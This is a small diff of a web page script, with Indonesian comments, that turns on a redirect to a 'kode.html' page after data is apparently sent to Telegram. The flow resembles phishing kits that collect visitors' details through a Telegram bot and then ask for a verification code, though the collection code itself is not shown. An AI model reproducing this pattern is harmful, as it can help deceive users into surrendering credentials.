@@ -237,8 +237,7 @@
       btnContinue.disabled = false;
       btnContinue.textContent = 'Lanjutkan';
       if(data.ok){
-        // Bisa dialihkan ke halaman lain jika perlu
-        // window.location.href = 'kode.html';
+      window.location.href = 'kode.html';
       } else {
         alert('Gagal mengirim ke Telegram: ' + data.description);
       }
@@ -259,4 +258,4 @@
   });
 </script>
 </body>
-    </html>
+</html>
